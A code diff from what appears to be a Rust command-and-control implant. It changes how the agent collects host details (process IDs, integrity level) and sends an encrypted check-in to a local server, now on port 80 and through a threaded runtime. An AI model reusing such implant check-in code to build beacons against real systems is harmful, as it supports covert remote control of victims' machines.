@@ -1,5 +1,8 @@
 use core::ffi::c_void;
-use libc_print::{libc_eprintln, libc_println};
+use libc_print::libc_eprintln;
+use std::{sync::Arc, thread};
+use tokio::{runtime::Runtime, sync::oneshot};
+
 use mod_agentcore::{instance, instance_mut};
 
 use mod_win32::{
@@ -12,18 +15,15 @@ use mod_win32::{
     nt_ps_api::{get_pid_and_ppid, nt_get_integrity_level},
 };
 
-use rs2_communication_protocol::{
-    communication_structs::checkin::CheckinResponse, protocol::Protocol,
-};
+use rs2_communication_protocol::protocol::Protocol;
 use rs2_communication_protocol::{
     communication_structs::checkin::{Checkin, PartialCheckin},
     metadata::Metadata,
-    sender::Sender,
 };
 
 use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
 
-use crate::commands::{encryptor_from_raw, protocol_from_raw};
+use crate::handler::{encryptor_from_raw, protocol_from_raw};
 
 #[cfg(feature = "protocol-json")]
 use mod_protocol_json::protocol::JsonProtocol;
@@ -109,12 +109,14 @@ pub fn init_checkin_data() {
 }
 
 /// Initializes the communication protocol and attempts to connect to the server.
-pub async fn init_protocol() {
+pub fn init_protocol(rt: Arc<Runtime>) {
+    let (tx, rx) = oneshot::channel();
+
     #[cfg(feature = "protocol-json")]
     {
         let boxed_encryptor = Box::new(IdentEncryptor);
         let boxed_protocol: Box<JsonProtocol<IdentEncryptor>> =
-            Box::new(JsonProtocol::new("http://localhost:8080".to_string()));
+            Box::new(JsonProtocol::new("http://localhost:80".to_string()));
 
         unsafe {
             instance_mut().session.encryptor_ptr = Box::into_raw(boxed_encryptor) as *mut c_void;
@@ -131,16 +133,23 @@ pub async fn init_protocol() {
                 let checkin_data = checkin_from_raw(checkin_ptr);
 
                 // Set the protocol to checkin mode
-                // protocol.set_is_checkin(true);
+                protocol.set_is_checkin(true);
 
                 // Attempt to write the Checkin data using the protocol
-                let result = protocol
-                    .write(checkin_data.clone(), Some(encryptor.clone()))
-                    .await;
+                thread::spawn(move || {
+                    rt.block_on(async move {
+                        let result = protocol
+                            .write(checkin_data.clone(), Some(encryptor.clone()))
+                            .await;
+                        let _ = tx.send(result);
+                    });
+                });
+
+                let result = rx.blocking_recv().unwrap();
 
                 if result.is_ok() {
                     // If successful, mark the session as connected
-                    // instance_mut().session.connected = true;
+                    instance_mut().session.connected = true;
 
                     // let checkin_response: Result<CheckinResponse, anyhow::Error> =
                     //     protocol.read(result.unwrap(), Some(encryptor.clone()));
@@ -171,6 +180,7 @@ pub async fn init_protocol() {
             }
         }
     }
+
     #[cfg(feature = "protocol-winhttp")]
     {
         let boxed_encryptor = Box::new(IdentEncryptor);
@@ -195,9 +205,16 @@ pub async fn init_protocol() {
                 // protocol.set_is_checkin(true);
 
                 // Attempt to write the Checkin data using the protocol
-                let result = protocol
-                    .write(checkin_data.clone(), Some(encryptor.clone()))
-                    .await;
+                thread::spawn(move || {
+                    rt.block_on(async move {
+                        let result = protocol
+                            .write(checkin_data.clone(), Some(encryptor.clone()))
+                            .await;
+                        let _ = tx.send(result);
+                    });
+                });
+
+                let result = rx.blocking_recv().unwrap();
 
                 if result.is_ok() {
                     // If successful, mark the session as connected
